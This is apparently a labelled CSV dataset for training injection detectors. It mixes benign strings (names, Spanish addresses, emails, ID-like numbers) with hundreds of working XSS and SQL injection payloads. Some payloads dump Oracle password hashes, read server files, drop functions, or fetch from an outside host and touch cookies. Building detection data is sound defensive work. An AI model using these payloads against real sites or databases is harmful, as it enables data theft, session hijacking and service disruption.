index,payload,type
13129,knippenberg@soyriojano.cf,benign
17493,"<header onbeforecopy=""alert(1)"" contenteditable>test</header>",xss
3034,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""vcvb"" like ""vcvb",sqli
13976,caballol menocal,benign
18420,"<source onpaste=""alert(1)"" contenteditable>test</source>",xss
16799,"<div draggable=""true"" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>",xss
3110,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""mubt""  =  ""mubt",sqli
3609,"-5300' union all select 2750,2750,2750,2750,2750,2750--",sqli
11534,zapardiel de la ribera,benign
12722,"c/ montereria, 146 4d",benign
11459,freydig rueda,benign
2937,"1   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
801,having,sqli
16293,"<code onpaste=""alert(1)"" contenteditable>test</code>",xss
2261,"-9596  )   where 3425  =  3425 union all select 3425,3425,3425,3425,3425,3425#",sqli
3304,-3881   )    )     )   union all select 4438--,sqli
18392,"<source draggable=""true"" ondragleave=""alert(1)"">test</source>",xss
14487,6.21E+15,benign
3466,"-8153' where 2436  =  2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",sqli
663," select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",sqli
13707,6.11E+15,benign
2494,"1'   )    )    as mdtm where 1393  =  1393 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
2183,"1' in boolean mode  )   union all select null,null--",sqli
3399,select   (  case when   (  7271  =  1658  )   then 7271 else 7271*  (  select 7271 from information_schema.character_sets  )   end  )  #,sqli
12827,rini,benign
2932,"1  )   as rtpl where 1262  =  1262 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
14800,jorge paquirachi,benign
15420,<menu id=x contextmenu=x onshow=alert(1)>right click me!,xss
19776,<svg><listing onload=alert(1)></listing>,xss
17137,"<embed oncontextmenu=""alert(1)"">test</embed>",xss
18167,<samp id=x tabindex=1 onbeforeactivate=alert(1)></samp>,xss
16462,<datalist id=x tabindex=1 ondeactivate=alert(1)></datalist><input id=y autofocus>,xss
1850,"1'   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
19439,"<style>@keyframes x{}</style><mark style=""animation-name:x"" onanimationend=""alert(1)""></mark>",xss
17046,"<dt onkeydown=""alert(1)"" contenteditable>test</dt>",xss
1504,"1""  )   where 1673  =  1673 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sqli
19092,"<style>@keyframes slidein {}</style><noembed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noembed>",xss
1118,"1%""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
18745,"<style>:target {color:red;}</style><canvas id=x style=""transition:color 1s"" ontransitionend=alert(1)></canvas>",xss
18146,"<s oncopy=""alert(1)"" contenteditable>test</s>",xss
13624,16340,benign
19097,"<style>@keyframes slidein {}</style><optgroup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></optgroup>",xss
13074,aventada,benign
11791,42462633x,benign
3303,1'||  (  select 'xdzp' from dual where 5786  =  5786 and   (  3020  =  3020  )  *6703  )  ||',sqli
18710,"<style>:target {color: red;}</style><tfoot id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tfoot>",xss
1725,"1'  )   union all select null,null,null,null,null,null#",sqli
13921,8.03E+15,benign
19816,<svg><set onend=alert(1) attributename=x dur=1s>,xss
17486,"<header draggable=""true"" ondragstart=""alert(1)"">test</header>",xss
17064,<element id=x tabindex=1 onbeforedeactivate=alert(1)></element><input autofocus>,xss
2106,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",sqli
16696,"<div draggable=""true"" contenteditable>drag me</div><audio ondrop=alert(1) contenteditable>drop here</audio>",xss
16045,"<body oncopy=""alert(1)"" contenteditable>test</body>",xss
2172,"1   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  9184  =  9184",sqli
2586,1'+  (  select 'xqjx' where 7048  =  7048 and 9198  =  9198--,sqli
1581,"1""   )    )    as ljhz where 2416  =  2416",sqli
3325,"1%'   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sqli
185,union select * from users where login   =   char ...,sqli
14882,poblacin de arroyo,benign
11931,thayra,benign
814,"""^""",sqli
14868,francisco jorquera s/n 1?d,benign
20707,"<div id=""53""><xml id=""xss"" src=""test.htc""></xml>",xss
130,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,sqli
3988,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",sqli
11474,protoalbitar,benign
16997,"<dl draggable=""true"" ondragstart=""alert(1)"">test</dl>",xss
17134,"<embed onbeforepaste=""alert(1)"" contenteditable>test</embed>",xss
3377,"-4394'   )    )    union all select 3409,3409--",sqli
11734,bscones de ojeda,benign
15337,<script src=//3334957647/1>,xss
13768,jeft,benign
15996,"<blockquote draggable=""true"" ondragleave=""alert(1)"">test</blockquote>",xss
11429,parke antonio trueba 175,benign
2340,if  (  1087  =  5839  )   select 1087 else drop function zzeh--,sqli
13037,"calle practicante calixto rodriguez 163,",benign
13745,argecilla,benign
20207,"<track draggable=""true"" ondragleave=""alert(1)"">test</track>",xss
2272,"1   )    )    as huxq where 7451  =  7451 union all select null,null,null--",sqli
53,\x27UNION SELECT,sqli
20845,"<maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:alert(2)"">CLICKME</maction>",xss
2197,1  )   where 5442  =  5442,sqli
15711,<audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>,xss
2772,"1  )   union all select null,null,null,null,null,null,null#",sqli
16524,<del id=x tabindex=1 onbeforeactivate=alert(1)></del>,xss
17638,"<i onmouseout=""alert(1)"">test</i>",xss
3024,"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qfvg'  =  'qfvg",sqli
3643,"-5478""  )   where 4100  =  4100 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",sqli
342,1' and non_existant_table   =   '1,sqli
15720,"<audio oncopy=""alert(1)"" contenteditable>test</audio>",xss
2063,"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'ppwh'  =  'ppwh",sqli
3178,-9143  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,sqli
12951,33825,benign
15098,philipa,benign
3865,"1%""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
17060,"<element draggable=""true"" ondragleave=""alert(1)"">test</element>",xss
12109,zarrapastrosamente,benign
3277," end and    (    (     (  ""poee""  =  ""poee",sqli
3009,1  )   as nsdy where 7513  =  7513,sqli
2552,"1   )    )    as amyr where 7875  =  7875 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
18037,"<rt draggable=""true"" ondragstart=""alert(1)"">test</rt>",xss
215,1 uni/**/on select all from where,sqli
16332,<colgroup id=x tabindex=1 onbeforeactivate=alert(1)></colgroup>,xss
1711,"-3443""   )    )    union all select 4043,4043,4043,4043,4043,4043,4043#",sqli
16074,"<br draggable=""true"" ondragstart=""alert(1)"">test</br>",xss
17077,<element onfocusout=alert(1) tabindex=1 id=x></element><input autofocus>,xss
19708,<svg><address onload=alert(1)></address>,xss
18734,"<style>:target {color:red;}</style><base id=x style=""transition:color 1s"" ontransitionend=alert(1)></base>",xss
19305,"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationend=""alert(1)""></aside>",xss
622," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",sqli
16499,"<dd onbeforepaste=""alert(1)"" contenteditable>test</dd>",xss
14066,"calle daniel florido rodriguez, 105, 2?f",benign
11380,5.84E+15,benign
749," select * from users where id  =  1 or 1#""$ union select 'a',version  (    )   -- 1",sqli
16795,"<div draggable=""true"" contenteditable>drag me</div><i ondragover=alert(1) contenteditable>drop here</i>",xss
14331,burgoa planells,benign
13734,apolilladura,benign
18583,"<style>:target {color: red;}</style><a id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></a>",xss
3453,"1   )    )    as rual where 4649  =  4649 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sqli
12374,24120558k,benign
20101,"<thead onmouseenter=""alert(1)"">test</thead>",xss
13148,enconadura,benign
16825,"<div draggable=""true"" contenteditable>drag me</div><map ondragover=alert(1) contenteditable>drop here</map>",xss
15414,<audio src onloadstart=alert(1)>,xss
630," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sqli
13551,ar2e5tad6,benign
15114,iris,benign
18332,<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>,xss
16517,"<dd onpaste=""alert(1)"" contenteditable>test</dd>",xss
3392,"1'  )   where 1363  =  1363 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
16895,"<div draggable=""true"" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>",xss
13103,6015,benign
18424,"<spacer draggable=""true"" ondragleave=""alert(1)"">test</spacer>",xss
2509,"1 where 1992  =  1992 union all select null,null--",sqli
19043,"<style>@keyframes slidein {}</style><dfn style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dfn>",xss
2983,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli
1976,"-4558' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sqli
2897,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%""  =  """,sqli
11716,4176,benign
1200,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",sqli
3256,select   (  case when   (  3344  =  8103  )   then 3344 else 1/  (  select 0  )   end  )  --,sqli
15100,odelsia,benign
13024,leobaldo,benign
14074,fulmer,benign
17178,"<fieldset onkeyup=""alert(1)"" contenteditable>test</fieldset>",xss
18053,<rt onfocusout=alert(1) tabindex=1 id=x></rt><input autofocus>,xss
2621,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,sqli
3328,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",sqli
20213,<track id=x tabindex=1 onfocus=alert(1)></track>,xss
2947,select   (  case when   (  5009  =  1133  )   then 5009 else 5009*  (  select 5009 from information_schema.character_sets  )   end  )  #,sqli
15011,"ruiz de alda, 78",benign
3251,"1""   )    )    as qhnb where 8302  =  8302 and   (  3020  =  3020  )  *6703--",sqli
1996,"-7683""  )   where 9664  =  9664 union all select 9664,9664,9664,9664,9664,9664,9664#",sqli
11605,8349,benign
3879,"1""  )   where 8196  =  8196",sqli
18591,"<style>:target {color: red;}</style><audio id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></audio>",xss
3517,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",sqli
17400,"<frameset oncut=""alert(1)"" contenteditable>test</frameset>",xss
472," select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",sqli
15048,06434691g,benign
14816,distar,benign
17397,"<frameset onclick=""alert(1)"">test</frameset>",xss
17421,"<h1 draggable=""true"" ondragleave=""alert(1)"">test</h1>",xss
13106,98918059g,benign
16923,"<div draggable=""true"" contenteditable>drag me</div><table ondragover=alert(1) contenteditable>drop here</table>",xss
16519,"<del draggable=""true"" ondragend=""alert(1)"">test</del>",xss
17236,"<figure oncopy=""alert(1)"" contenteditable>test</figure>",xss
2285,1' where 2547  =  2547 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,sqli
19539,"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationend=""alert(1)""></td>",xss
15413,<marquee loop=1 width=0 onfinish=alert(1)>,xss
18200,<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>,xss
405," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",sqli
14493,2.04E+14,benign
14271,"c/ gaspar reyes, 172 8?f",benign
14045,"c/ poetisa juana luna 135, 5-g",benign
944,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",sqli
11903,38182378d,benign
15986,"<blink onmouseenter=""alert(1)"">test</blink>",xss
16865,"<div draggable=""true"" contenteditable>drag me</div><param ondragover=alert(1) contenteditable>drop here</param>",xss
15849,"<bdi oncontextmenu=""alert(1)"">test</bdi>",xss
16097,"<br onmousemove=""alert(1)"">test</br>",xss
12391,corsini-vischer@viajesdacapalla.nl,benign
15083,26133,benign
15394,"""><script src=data:&comma;alert(1)//",xss
14954,coppin@sexl.no,benign
2891,"1%"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""%""  =  """,sqli
1063,"1',  (  select   (  case when   (  2106  =  2106  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 2106*  (  select 2106 from master..sysdatabases  )   end   )    )   ",sqli
368,sleep 50',sqli
20521,"<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>",xss
3193,"select * from generate_series  (  9434,9434,case when   (  9434  =  3991  )   then 1 else 0 end  )   limit 1--",sqli
725," select * from users where id  =  1 or @#""  (    =  1 union select 1,version  (    )   -- 1",sqli
1305,1   )    )     )   waitfor delay '0:0:5'--,sqli
17997,"<rb onmouseout=""alert(1)"">test</rb>",xss
11778,3820,benign
18033,"<rt draggable=""true"" ondrag=""alert(1)"">test</rt>",xss
11465,de1l2nda9ur4,benign
462,||'6,sqli
17857,"<plaintext oncontextmenu=""alert(1)"">test</plaintext>",xss
16359,"<command draggable=""true"" ondragend=""alert(1)"">test</command>",xss
20224,<track onfocusout=alert(1) tabindex=1 id=x></track><input autofocus>,xss
657," select * from users where id  =  1 or ""  (  _"" or 1  =  1 -- 1",sqli
15642,"<article onbeforepaste=""alert(1)"" contenteditable>test</article>",xss
1797,"1"" where 1051  =  1051 union all select null--",sqli
1532,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,sqli
17043,"<dt oncut=""alert(1)"" contenteditable>test</dt>",xss
19118,"<style>@keyframes slidein {}</style><slot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></slot>",xss
19337,"<style>@keyframes x{}</style><center style=""animation-name:x"" onanimationend=""alert(1)""></center>",xss
19067,"<style>@keyframes slidein {}</style><iframe style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></iframe>",xss
3563,"1  )   where 8630  =  8630 union all select null,null--",sqli
11866,20001,benign
735, )   or   (  'x'  =  'x,sqli
14382,kashfi@cropbay.jobs,benign
1247,"1,exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",sqli
19970,"<template onmouseleave=""alert(1)"">test</template>",xss
3045,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'eznq' like 'eznq",sqli
2707,1' and 7533  =  7533 and 'frvk'  =  'frvk,sqli
17005,"<dl onbeforecut=""alert(1)"" contenteditable>test</dl>",xss
15031,wittik,benign
589, ( ,sqli
20715,"<? '=""foo""><x foo='><img src=x onerror=alert(3)//'>//[""'`-->]]>]</div>",xss
20186,<tr onblur=alert(1) tabindex=1 id=x></tr><input autofocus>,xss
20700,"<div id=""42""><head><base href=""javascript://""/></head><body><a href=""/. /,alert(42)//#"">XXX</a></body>//[""'`-->]]>]</div>",xss
14154,pingshen,benign
12291,gupton,benign
2478,"-3546%"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""%""  =  """,sqli
12998,re1v566i7ator0o,benign
19818,<svg><shadow onload=alert(1)></shadow>,xss
14894,4ntra6a,benign
3875,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'xori' like 'xori",sqli
2057,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",sqli
14893,7.87E+15,benign
2510,"1"" and 5205  =  9975#",sqli
15960,"<big onpaste=""alert(1)"" contenteditable>test</big>",xss
3296,"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",sqli
18242,<section onblur=alert(1) tabindex=1 id=x></section><input autofocus>,xss
12965,puntallana,benign
12481,klaudt,benign
15198,torrecilla del monte,benign
11484,harmony,benign
17822,"<ins onkeyup=""alert(1)"" contenteditable>test</ins>",xss
3378,-2960' or 2163  =  3143--,sqli
13861,"c/ montealegre s/n, 9-b",benign
596," select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",sqli
15322,<x ondrag=alert(1)>drag this! ,xss
19890,<tbody id=x tabindex=1 onfocusin=alert(1)></tbody>,xss
15806,<basefont id=x tabindex=1 onactivate=alert(1)></basefont>,xss
12059,8en7dill3,benign
13011,"pealara, 87",benign
1249,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,sqli
13490,02879028a,benign
13007,rayadillo,benign
13623,membrilla,benign
16," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",sqli
11494,1.44E+15,benign
18127,"<ruby onmouseup=""alert(1)"">test</ruby>",xss
3900,-6518'   )    )    as vocx where 2539  =  2539 or   (  8652  =  2025  )  *2025--,sqli
12772,31819774x,benign
17343,"<form onmouseout=""alert(1)"">test</form>",xss
18537,<strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>,xss
20509,"<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>",xss
14367,bosch linares,benign
1119,"1""   )    )    as rcse where 4559  =  4559 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",sqli
3850,"1%""   )    )    union all select null,null,null,null,null,null,null--",sqli
17462,"<head onbeforecut=""alert(1)"" contenteditable>test</head>",xss
14731,"calle miquel santandreu 66,",benign
1444,1  )   rlike   (  select   (  case when   (  8488  =  1270  )   then 1 else 0x28 end   )    ) ,sqli
18284,"<select onkeyup=""alert(1)"" contenteditable>test</select>",xss
931,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,sqli
18820,"<style>:target {color:red;}</style><pre id=x style=""transition:color 1s"" ontransitionend=alert(1)></pre>",xss
16434,"<data onbeforecut=""alert(1)"" contenteditable>test</data>",xss
15138,wanda,benign
12652,kaz,benign
14094,trebaol@arroyomolinos-madrid.gq,benign
18854,"<style>:target {color:red;}</style><time id=x style=""transition:color 1s"" ontransitionend=alert(1)></time>",xss
15133,"camino del caliero, 75",benign
2832,"1%""   )    )     )   union all select null,null,null#",sqli
20388,<video onblur=alert(1) tabindex=1 id=x></video><input autofocus>,xss
932,"1   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  1748  =  1748",sqli
18365,<small id=x tabindex=1 ondeactivate=alert(1)></small><input id=y autofocus>,xss
1241,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sqli
2476,1'  )   where 9159  =  9159,sqli
17199,"<figcaption onbeforecut=""alert(1)"" contenteditable>test</figcaption>",xss
12236,eu,benign
14519,42180,benign
18208,"<script onclick=""alert(1)"">test</script>",xss
15417,<keygen autofocus onfocus=alert(1)>,xss
2594,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,sqli
3892,1'   )    )    as qaki where 5272  =  5272,sqli
14380,50615,benign
15530,"<acronym onmouseout=""alert(1)"">test</acronym>",xss
111,declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,sqli
18," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",sqli
16255,"<cite onmouseenter=""alert(1)"">test</cite>",xss
1262,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",sqli
11939,2.46E+15,benign
16518,"<del draggable=""true"" ondrag=""alert(1)"">test</del>",xss
13016,calle laguna de pealara 171 12-e,benign
18681,"<style>:target {color: red;}</style><q id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></q>",xss
13818,loudiadi,benign
19213,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ins id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ins>",xss
1435,"1%' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '%'  =  '",sqli
15511,<acronym id=x tabindex=1 onfocus=alert(1)></acronym>,xss
3653,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",sqli
12470,39395797v,benign
12387,88341714w,benign
12455,9570,benign
20068,"<th onmousedown=""alert(1)"">test</th>",xss
253," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",sqli
14536,judas,benign
13380,5.01E+15,benign
1511,select   (  case when   (  7217  =  7631  )   then 7217 else 7217*  (  select 7217 from information_schema.character_sets  )   end  )  #,sqli
14468,"c/ huescar 60,",benign
12217,1437,benign
13794,chimillas,benign
78," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",sqli
1414,-1890'   )    )     )   or 8526  =  1389 and    (    (     (  'ecgt'  =  'ecgt,sqli
3981,1%'   )    )    and sleep  (  5  )  #,sqli
18022,"<rp onkeydown=""alert(1)"" contenteditable>test</rp>",xss
3460,"-7060'  )   or make_set  (  4233  =  1689,1689  )   and   (  'twpr' like 'twpr",sqli
18099,"<ruby draggable=""true"" ondragenter=""alert(1)"">test</ruby>",xss
3709,"-6496""  )   as obnf where 2903  =  2903 or make_set  (  9354  =  9354,7185  )  --",sqli
3067,"1'  )   union all select null,null,null,null--",sqli
20862,"<set attributeName=""xlink:href"" begin=""accessKey(a)"" to=""//example.com/?a"" />",xss
20773,*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */,xss
17505,"<header onkeyup=""alert(1)"" contenteditable>test</header>",xss
3374,"1%""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""%""  =  """,sqli
19725,<svg><bgsound onload=alert(1)></bgsound>,xss
3071,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",sqli
15453,"<a onclick=""alert(1)"">test</a>",xss
2948,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",sqli
18874,"<style>:target {transform: rotate(180deg);}</style><b id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></b>",xss
12851,dicaprio,benign
19525,"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationend=""alert(1)""></style>",xss
20367,"<video autoplay controls onvolumechange=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",xss
